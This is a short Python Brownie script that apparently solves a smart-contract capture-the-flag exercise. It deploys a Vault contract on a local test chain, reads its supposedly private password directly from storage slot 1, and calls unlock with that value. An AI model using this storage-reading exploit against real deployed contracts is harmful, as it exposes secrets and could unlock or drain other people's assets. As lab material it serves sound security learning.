import os
from brownie import *
from web3 import Web3
from eth_utils import encode_hex

# function to deploy contract
def deploy_vault(owr, usr1):
    # deploy contract flip
    psw = encode_hex('Goodbye cocodrile!')
    scv = Vault.deploy(psw, {'from':owr})
    return scv

def unlock(vault):
    # unlocked?
    un1 = vault.locked()
    # get psw, stored in position 1 of block
    hex_pwd = web3.eth.getStorageAt(vault.address, 1)
    #pwd = decode_hex(hex_pwd)
    print(f"[+] Coded password, {hex_pwd}")
    # unlock vault 
    vault.unlock(hex_pwd)
    # check lock
    un2 = vault.locked()
    print(f'[*] Initially locked {un1}')
    print(f'[*] Vault locked {un2}')
def main():
    # deployer and first owner
    owner = accounts[0]
    user1 = accounts[1]
    # deploy contract
    c_v = deploy_vault(owner, user1)
    # make guess
    unlock(c_v)